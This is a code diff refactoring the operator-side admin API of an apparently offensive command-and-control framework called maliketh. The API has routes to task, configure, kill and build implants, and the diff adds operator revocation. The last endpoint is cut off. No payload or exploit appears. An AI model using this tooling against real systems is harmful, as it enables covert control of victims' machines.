@@ -7,17 +7,18 @@ from flask import Blueprint, jsonify, request
 from maliketh.db import db
 from maliketh.models import *
 from maliketh.crypto.ec import *
-from maliketh.crypto.utils import random_hex, random_string
+from maliketh.crypto.utils import random_hex
 from maliketh.config import OP_ROUTES
 from maliketh.opcodes import Opcodes
 from maliketh.builder.builder import ImplantBuilder, BuilderOptions
+from maliketh.listeners.utils import error_json, success_json, create_route
 from functools import wraps
 
 admin = Blueprint("admin", __name__, url_prefix=OP_ROUTES["base_path"])
 start_time = datetime.now()
 
 
-def verify_auth_token(request) -> Optional[str]:
+def verify_auth_token(request) -> Optional[Operator]:
     """
     Given a request, verify its Authentication header
 
@@ -51,7 +52,8 @@ def verify_auth_token(request) -> Optional[str]:
 
 def verified(func):
     """
-    Decorator to check if the request is authenticated
+    Decorator to check if the request is authenticated and the operator hasnt had their access revoked.
+
     :param func: The function to decorate
     :return The decorated function with the operator as a keyword argument
     """
@@ -61,17 +63,18 @@ def verified(func):
         # Check if the request is authenticated
         operator = verify_auth_token(request)
         if operator is None:
-            return jsonify({"status": False, "msg": "Not authenticated"}), 401
+            return error_json("Not authenticated")
+        
+        if operator.revoked:
+            return error_json("Your access has been revoked. Please contact the admin to resolve.")
+
         kwargs = {**kwargs, "operator": operator}
         return func(*args, **kwargs)
 
     return wrapper
 
 
-@admin.route(
-    OP_ROUTES["stats"]["path"],
-    methods=OP_ROUTES["stats"]["methods"],
-)
+@create_route(admin, "stats")
 @verified
 def server_stats(operator: Operator) -> Any:
     """
@@ -98,19 +101,15 @@ def server_stats(operator: Operator) -> Any:
     )
 
 
-# @admin.route("/op/auth/token/request", methods=["GET"])  # type: ignore
-@admin.route(
-    OP_ROUTES["request_auth_token"]["path"],
-    methods=OP_ROUTES["request_auth_token"]["methods"],
-)
+@create_route(admin, "request_auth_token")
 def request_token() -> Any:
     # Check if X-ID and X-Signature header is present
     if any(x not in request.headers for x in ["X-ID", "X-Signature"]):
-        return jsonify({"status": False, "message": "Unknown operator key"}), 400
+        return error_json("Unknown operator key", 400)
 
     # Check if they have content
     if any(len(request.headers[x]) == 0 for x in ["X-ID", "X-Signature"]):
-        return jsonify({"status": False, "message": "Unknown operator key"}), 400
+        return error_json("Unknown operator key", 400)
 
     # X-Signature is in format base64(enc_and_sign(pub_key, operator_signing_key, server_pub_key))
     # So we need to decrypt it with the server public key,
@@ -119,31 +118,23 @@ def request_token() -> Any:
     # Get the operator from X-ID
     operator = Operator.query.filter_by(username=request.headers["X-ID"]).first()
     if operator is None:
-        return jsonify({"status": False, "message": "Unknown operator"}), 400
+        return error_json("Unknown operator", 400)
 
     try:
         original_message = decrypt_and_verify(
             bytes(request.headers["X-Signature"], "utf-8"), operator
         )
     except nacl.exceptions.CryptoError:
-        return jsonify({"status": False, "msg": "Couldn't decrypt signature"}), 400
+        return error_json("Couldn't decrypt signature", 400)
 
     if original_message is None:
-        return jsonify({"status": False, "msg": "Couldn't verify signature"}), 400
+        return error_json("Couldn't verify signature", 400)
 
     original_message = original_message.decode("utf-8")
 
     if original_message != operator.login_secret:
-        return (
-            jsonify(
-                {
-                    "status": False,
-                    "msg": "Unable to verify signature",
-                }
-            ),
-            400,
-        )
-
+        return error_json("Unable to verify signature", 400)
+            
     # If we get here, the operator is authenticated
 
     # Check if the token is still valid
@@ -163,8 +154,6 @@ def request_token() -> Any:
         )
         db.session.commit()
 
-    # TODO rabbitmq stuff
-
     return (
         jsonify(
             {
@@ -179,11 +168,7 @@ def request_token() -> Any:
     )
 
 
-# @admin.route("/op/auth/token/revoke", methods=["GET"])  # type: ignore
-@admin.route(
-    OP_ROUTES["revoke_auth_token"]["path"],
-    methods=OP_ROUTES["revoke_auth_token"]["methods"],
-)
+@create_route(admin, "revoke_auth_token")
 @verified
 def revoke_token(operator: Operator) -> Any:
     operator.auth_token = None  # type: ignore
@@ -192,22 +177,15 @@ def revoke_token(operator: Operator) -> Any:
     return jsonify({"status": True}), 200
 
 
-@admin.route(
-    OP_ROUTES["auth_token_status"]["path"],
-    methods=OP_ROUTES["auth_token_status"]["methods"],
-)
+@create_route(admin, "auth_token_status")
 def token_status() -> Any:
     operator = verify_auth_token(request)
     if operator is None:
-        return jsonify({"status": False, "msg": "Not authenticated"}), 401
-    return jsonify({"status": True, "msg": "Authenticated"}), 200
+        return error_json("Not authenticated")
+    return success_json("Authenticated")
 
 
-# @admin.route("/op/tasks/list", methods=["GET"])  # type: ignore
-@admin.route(
-    OP_ROUTES["list_tasks"]["path"],
-    methods=OP_ROUTES["list_tasks"]["methods"],
-)
+@create_route(admin, "list_tasks")
 @verified
 def list_tasks(operator: Operator) -> Any:
     """
@@ -217,11 +195,7 @@ def list_tasks(operator: Operator) -> Any:
     return jsonify({"status": True, "tasks": [x.toJSON() for x in tasks]}), 200
 
 
-# @admin.route("/op/tasks/add", methods=["POST"])  # type: ignore
-@admin.route(
-    OP_ROUTES["add_task"]["path"],
-    methods=OP_ROUTES["add_task"]["methods"],
-)
+@create_route(admin, "add_task")
 @verified
 def add_task(operator: Operator) -> Any:
     """
@@ -229,7 +203,7 @@ def add_task(operator: Operator) -> Any:
     """
 
     if request.json is None:
-        return jsonify({"status": False, "msg": "Invalid request, no JSON body"}), 400
+        return error_json("Invalid request, no JSON body", 400)
 
     # Get the task
     task = request.json
@@ -238,15 +212,7 @@ def add_task(operator: Operator) -> Any:
 
     # Check if the task is valid
     if any(x not in task for x in required_fields):
-        return (
-            jsonify(
-                {
-                    "status": False,
-                    "msg": f"Invalid task, missing fields: {', '.join(required_fields - task.keys())}",
-                }
-            ),
-            400,
-        )
+        return error_json(f"Invalid task, missing fields: {', '.join(required_fields - task.keys())}", 400)
 
     # Create the task
     task = Task.new_task(
@@ -259,11 +225,7 @@ def add_task(operator: Operator) -> Any:
     return jsonify({"status": True, "task": task.toJSON()}), 200
 
 
-# @admin.route("/op/tasks/result/<task_id>", methods=["GET"])  # type: ignore
-@admin.route(
-    OP_ROUTES["task_results"]["path"],
-    methods=OP_ROUTES["task_results"]["methods"],
-)
+@create_route(admin, "task_results")
 @verified
 def get_task_result(operator: Operator, task_id: str) -> Any:
     """
@@ -272,19 +234,15 @@ def get_task_result(operator: Operator, task_id: str) -> Any:
     # Check if this operator owns the task
     task = Task.query.filter_by(task_id=task_id).first()
     if task is None:
-        return jsonify({"status": False, "msg": "Unknown task"}), 400
+        return error_json("Unknown task", 400)
 
     if task.operator_name != operator.username:
-        return jsonify({"status": False, "msg": "Unauthorized"}), 401
+        return error_json("Unauthorized")
 
     return jsonify({"status": True, "result": task.output}), 200
 
 
-# @admin.route("/op/tasks/delete/<task_id>", methods=["DELETE"])  # type: ignore
-@admin.route(
-    OP_ROUTES["delete_task"]["path"],
-    methods=OP_ROUTES["delete_task"]["methods"],
-)
+@create_route(admin, "delete_task")
 @verified
 def delete_task(operator: Operator, task_id: str) -> Any:
     """
@@ -293,10 +251,10 @@ def delete_task(operator: Operator, task_id: str) -> Any:
     # Check if this operator owns the task
     task = Task.query.filter_by(task_id=task_id).first()
     if task is None:
-        return jsonify({"status": False, "msg": "Unknown task"}), 400
+        return error_json("Unknown task", 400)
 
     if task.operator_name != operator.username:
-        return jsonify({"status": False, "msg": "Unauthorized"}), 401
+        return error_json("Unauthorized")
 
     db.session.delete(task)
     db.session.commit()
@@ -304,10 +262,7 @@ def delete_task(operator: Operator, task_id: str) -> Any:
     return jsonify({"status": True}), 200
 
 
-@admin.route(
-    OP_ROUTES["list_implants"]["path"],
-    methods=OP_ROUTES["list_implants"]["methods"],
-)
+@create_route(admin, "list_implants")
 @verified
 def list_implants(operator: Operator) -> Any:
     """
@@ -317,17 +272,14 @@ def list_implants(operator: Operator) -> Any:
     return jsonify({"status": True, "implants": [x.toJSON() for x in implants]}), 200
 
 
-@admin.route(
-    OP_ROUTES["update_implant_config"]["path"],
-    methods=OP_ROUTES["update_implant_config"]["methods"],
-)
+@create_route(admin, "update_implant_config")
 @verified
 def update_config(operator: Operator, implant_id: str) -> Any:
     """
     Update the config of an implant. This will trigger a config update task
     """
     if request.json is None:
-        return jsonify({"status": False, "msg": "Invalid request, no JSON body"}), 400
+        return error_json("Invalid request, no JSON body", 400)
 
     # Get the task
     config = request.json
@@ -335,7 +287,7 @@ def update_config(operator: Operator, implant_id: str) -> Any:
     # Update implant's config in the database
     current_config = ImplantConfig.query.filter_by(implant_id=implant_id).first()
     if current_config is None:
-        return jsonify({"status": False, "msg": "Unknown implant"}), 400
+        return error_json("Unknown implant", 400)
 
     try:
 
@@ -347,10 +299,7 @@ def update_config(operator: Operator, implant_id: str) -> Any:
         }
 
         if len(config) == 0:
-            return (
-                jsonify({"status": False, "msg": "No valid fields found in request"}),
-                400,
-            )
+            return error_json("No valid fields found in request", 400)
 
         # Update fields present in the request
         for key, value in config.items():
@@ -363,15 +312,12 @@ def update_config(operator: Operator, implant_id: str) -> Any:
         )
     except Exception as e:
         print(e)
-        return jsonify({"status": False, "msg": f"Error updating config: {e}"}), 400
+        return error_json(f"Error updating config: {e}", 400)
 
     return jsonify({"status": True, "task": task.toJSON()}), 200
 
 
-@admin.route(
-    OP_ROUTES["get_implant_config"]["path"],
-    methods=OP_ROUTES["get_implant_config"]["methods"],
-)
+@create_route(admin, "get_implant_config")
 @verified
 def get_implant_config(implant_id: str, operator: Operator) -> Any:
     """
@@ -379,15 +325,12 @@ def get_implant_config(implant_id: str, operator: Operator) -> Any:
     """
     config = ImplantConfig.query.filter_by(implant_id=implant_id).first()
     if config is None:
-        return jsonify({"status": False, "msg": "Unknown implant"}), 400
+        return error_json("Unknown implant", 400)
 
     return jsonify({"status": True, "config": config.toJSON()}), 200
 
 
-@admin.route(
-    OP_ROUTES["kill_implant"]["path"],
-    methods=OP_ROUTES["kill_implant"]["methods"],
-)
+@create_route(admin, "kill_implant")
 @verified
 def kill_implant(operator: Operator, implant_id: str) -> Any:
     """
@@ -397,7 +340,7 @@ def kill_implant(operator: Operator, implant_id: str) -> Any:
     # See if implant exists
     implant = Implant.query.filter_by(implant_id=implant_id).first()
     if implant is None:
-        return jsonify({"status": False, "msg": "Unknown implant"}), 400
+        return error_json("Unknown implant", 400)
 
     # Create the task
     Task.new_task(
@@ -412,22 +355,31 @@ def kill_implant(operator: Operator, implant_id: str) -> Any:
     return jsonify({"status": True}), 200
 
 
-@admin.route(
-    OP_ROUTES["build_implant"]["path"],
-    methods=OP_ROUTES["build_implant"]["methods"],
-)
+@create_route(admin, "build_implant")
 @verified
 def build_implant(operator: Operator) -> Any:
     """
     Build an implant
     """
     if request.json is None:
-        return jsonify({"status": False, "msg": "Invalid request, no JSON body"}), 400
+        return error_json("Invalid request, no JSON body", 400)
 
     # Get the build options
     build_opts_json = request.json
 
     builder = ImplantBuilder(operator.username)
     implant_bytes = builder.with_options(BuilderOptions.from_dict(build_opts_json)).build()
+    if implant_bytes is None:
+        return error_json("Error building implant", 500)
 
     return jsonify({"status": True, "implant": base64.b64encode(implant_bytes).decode('utf-8')}), 200
+
+@create_route(admin, "admin_revoke_operator")
+@verified
+def admin_revoke_operator(operator: Operator):
+    """
+    Administrative endpoint to revoke operators access.
+    """
+
+    if request.json is None:
+        return error_json("Invalid request, no JSON body", 400)
